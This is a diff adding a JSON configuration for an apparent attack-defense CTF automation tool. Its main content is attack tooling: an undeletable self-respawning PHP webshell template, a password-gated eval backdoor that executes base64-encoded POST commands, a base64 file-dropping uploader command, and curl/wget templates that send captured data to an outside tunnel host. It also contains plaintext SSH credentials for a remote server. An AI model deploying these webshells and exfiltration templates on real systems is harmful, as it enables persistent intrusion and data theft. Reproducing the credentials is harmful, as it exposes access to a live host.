@@ -1,0 +1,65 @@
+{
+    "system":{
+        "reloadSettingInterval":10000
+    },
+    "self":{
+        "token":"serfendTeam",
+        "webrootPath":"/app",
+        "localBkPath":"/server_bck",
+        "sshConfig":{
+            "hostname" : "47.74.238.240",
+            "port" : "2201",
+            "username" : "ctf",
+            "password":"7f634ab2525ea114f00b97b3190ca344",
+            "pfile":""
+        },
+        "dbConfig":{
+            "dbName":"db",
+            "username":"un",
+            "password":"pd"
+        }
+    },
+    "server":{
+        "url":"http://edprin.natappfree.cc",
+        "header":{
+            
+        },
+        "method":"get"
+    },
+    "env":{
+        "ips":[
+            "192.168.8.119:8801"
+            
+        ],
+        "requestTimeout":3,
+        "rawbackdoor_list":
+        [
+            {
+                "payload":"p={0}",
+                "url":"admin/header.php",
+                "method":"get",
+                "cookies":"",
+                "teamBlacklist":[]
+            }
+        ],
+        "troj":{
+            "fileType":"php5",
+            "uploader":"/bin/echo '{0}' | /usr/bin/base64 -d > {1}",
+            "killer":"killall -uwww-data",
+            "tpl":{
+                "immortalTroj":"<?php unlink(__FILE__);ignore_user_abort(true);set_time_limit(0);while (1){file_put_contents('{1}',base64_decode('{0}'));usleep(1000);}}?>",
+                "subTroj":"<?php echo 'your id:' . md5($_GET['{0}']) . '-to-{1}';if (md5($_GET['{0}'])==='{1}'){{$tmp=base64_decode($_POST['cmd']);@eval($tmp);}}?>"
+            }
+        },
+        "cmd_tpl":{
+            "default":"{0}",
+            "curl":"/usr/bin/curl {0} -d '{1}'",
+            "wget":"/usr/bin/wget {0}/?{1}"
+        }
+    }
+}
+
+
+
+
+
